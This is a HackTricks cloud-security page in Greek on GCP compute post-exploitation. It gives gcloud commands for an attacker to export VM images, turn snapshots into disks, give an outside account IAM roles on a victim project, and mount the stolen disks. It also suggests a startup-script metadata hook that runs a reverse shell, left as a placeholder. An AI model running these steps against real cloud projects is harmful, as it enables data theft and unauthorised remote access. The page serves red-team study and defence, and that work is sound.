# GCP - Compute Post Exploitation

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Compute

Για περισσότερες πληροφορίες σχετικά με το Compute και το VPC (Networking) ελέγξτε:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Εξαγωγή & Επιθεώρηση Εικόνων τοπικά

Αυτό θα επιτρέπει σε έναν επιτιθέμενο να **έχει πρόσβαση στα δεδομένα που περιέχονται σε ήδη υπάρχουσες εικόνες** ή να **δημιουργήσει νέες εικόνες εκτελούμενων VMs** και να έχει πρόσβαση στα δεδομένα τους χωρίς να έχει πρόσβαση στο εκτελούμενο VM.

Είναι δυνατόν να εξαχθεί μια εικόνα VM σε ένα bucket και στη συνέχεια να την κατεβάσετε και να την προσαρτήσετε τοπικά με την εντολή:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Για να εκτελεστεί αυτή η ενέργεια, ο επιτιθέμενος μπορεί να χρειαστεί δικαιώματα πάνω στον αποθηκευτικό κάδο και σίγουρα **δικαιώματα πάνω στο cloudbuild** καθώς είναι το **service** που θα ζητηθεί να εκτελέσει την εξαγωγή.\
Επιπλέον, για να λειτουργήσει αυτό, ο λογαριασμός cloudbuild SA και ο λογαριασμός compute SA χρειάζονται προνομιούχες άδειες.\
Ο λογαριασμός cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` χρειάζεται:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Και ο λογαριασμός SA `<project-id>-compute@developer.gserviceaccount.com` χρειάζεται:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Εξαγωγή και επιθεώρηση Snapshots & Disks τοπικά

Δεν είναι δυνατή η άμεση εξαγωγή snapshots και δίσκων, αλλά είναι δυνατό να **μετατραπεί ένα snapshot σε έναν δίσκο, ένας δίσκος σε μια εικόνα** και ακολουθώντας την **προηγούμενη ενότητα**, να εξαχθεί αυτή η εικόνα για επιθεώρηση τοπικά.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Επιθεώρηση ενός εικόνας δημιουργώντας ένα VM

Με σκοπό την πρόσβαση στα **δεδομένα που αποθηκεύονται σε μια εικόνα** ή μέσα σε ένα **εκτελούμενο VM** από όπου ένας επιτιθέμενος **έχει δημιουργήσει μια εικόνα**, είναι δυνατό να παραχωρηθεί πρόσβαση σε έναν εξωτερικό λογαριασμό πάνω στην εικόνα:

```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```

και στη συνέχεια δημιουργήστε ένα νέο VM από αυτό:

```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```

Εάν δεν μπορείτε να δώσετε πρόσβαση στον εξωτερικό σας λογαριασμό στην εικόνα, μπορείτε να ξεκινήσετε έναν εικονικό υπολογιστή (VM) χρησιμοποιώντας αυτήν την εικόνα στο έργο του θύματος και να κάνετε τα μεταδεδομένα να εκτελέσουν ένα αντίστροφο κέλυφος (reverse shell) για να αποκτήσετε πρόσβαση στην εικόνα προσθέτοντας την παράμετρο:

```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```

### Επιθεώρηση ενός Snapshot/Disk προσαρτώντας το σε ένα VM

Με σκοπό την πρόσβαση στα **δεδομένα που αποθηκεύονται σε ένα δίσκο ή ένα snapshot, μπορείτε να μετατρέψετε το snapshot σε δίσκο, τον δίσκο σε εικόνα και να ακολουθήσετε τα προηγούμενα βήματα.**

Ή μπορείτε να **χορηγήσετε πρόσβαση σε έναν εξωτερικό λογαριασμό** στον δίσκο (αν η αρχική κατάσταση είναι ένα snapshot, χορηγήστε πρόσβαση στο snapshot ή δημιουργήστε έναν δίσκο από αυτόν):

```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```

**Συνδέστε το δίσκο** σε μια εικονική μηχανή:

```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```

Τοποθετήστε το δίσκο μέσα στην εικονική μηχανή (VM):

1. **Συνδεθείτε με SSH στην VM**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```

2. **Αναγνωρίστε τον δίσκο**: Μόλις βρεθείτε μέσα στην VM, αναγνωρίστε τον νέο δίσκο από τη λίστα των συσκευών δίσκου. Συνήθως, μπορείτε να τον βρείτε ως `/dev/sdb`, `/dev/sdc`, κλπ.
3. **Μορφοποιήστε και τοποθετήστε τον δίσκο** (αν είναι νέος ή ακατέργαστος δίσκος):

* Δημιουργήστε ένα σημείο προσάρτησης:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```

* Προσαρτήστε τον δίσκο:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

Εάν **δεν μπορείτε να δώσετε πρόσβαση σε ένα εξωτερικό έργο** στο αντίγραφο ασφαλείας ή τον δίσκο, μπορεί να χρειαστεί να εκτελέσετε αυτές τις ενέργειες μέσα σε μια εικονική μηχανή στο ίδιο έργο με το αντίγραφο ασφαλείας/δίσκο.
